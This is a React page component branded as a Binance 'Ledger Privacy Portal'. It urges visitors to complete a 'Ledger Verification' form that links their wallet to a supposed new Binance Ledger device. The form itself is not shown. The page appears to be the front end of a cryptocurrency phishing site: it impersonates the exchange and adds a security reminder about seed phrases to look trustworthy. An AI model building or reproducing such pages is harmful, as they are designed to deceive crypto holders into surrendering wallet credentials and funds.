
import React from "react";
import BinanceHeader from "@/components/BinanceHeader";
import BinanceFooter from "@/components/BinanceFooter";
import BinanceLedgerForm from "@/components/BinanceLedgerForm";

const Index = () => {
  return (
    <div className="min-h-screen flex flex-col bg-binance-dark text-white">
      <BinanceHeader />
      
      <main className="flex-grow">
        {/* Hero Section */}
        <div className="bg-binance-black py-10 md:py-16">
          <div className="container mx-auto px-4">
            <div className="max-w-4xl mx-auto text-center">
              <h1 className="text-3xl md:text-4xl font-bold mb-4">
                Binance Ledger <span className="text-binance-yellow">Privacy Portal</span>
              </h1>
              <p className="text-gray-300 text-lg mb-6">
                Secure your crypto assets with the most trusted hardware wallet in the industry
              </p>
              <div className="flex justify-center space-x-4">
                <div className="w-1/4 md:w-1/6 h-px bg-binance-yellow my-auto"></div>
                <span className="text-binance-yellow px-4">Trusted by millions</span>
                <div className="w-1/4 md:w-1/6 h-px bg-binance-yellow my-auto"></div>
              </div>
            </div>
          </div>
        </div>
        
        {/* Form Section */}
        <div className="container mx-auto px-4 py-10">
          <div className="max-w-4xl mx-auto mb-12">
            <h2 className="text-2xl font-bold mb-4">Ledger Verification</h2>
            <p className="text-gray-300">
              To ensure the security of your assets, please complete the verification process below. 
              This form will help us confirm your identity and link your wallet to your new Binance Ledger device.
            </p>
          </div>
          
          <BinanceLedgerForm />
          
          <div className="max-w-2xl mx-auto mt-12 bg-binance-darkGray/50 border border-gray-700 rounded-lg p-6">
            <h3 className="text-xl font-medium mb-3 text-binance-yellow">Security Reminder</h3>
            <p className="text-gray-300 mb-4">
              Binance will never ask for your private keys or seed phrases through unofficial channels. 
              Always verify you are on the official Binance website before entering sensitive information.
            </p>
            <ul className="list-disc pl-5 text-gray-300 space-y-2">
              <li>Never share your private keys or seed phrases with anyone</li>
              <li>Always verify the URL is correct before entering information</li>
              <li>Enable two-factor authentication for all your accounts</li>
              <li>Be cautious of phishing attempts and suspicious emails</li>
            </ul>
          </div>
        </div>
      </main>
      
      <BinanceFooter />
    </div>
  );
};

export default Index;
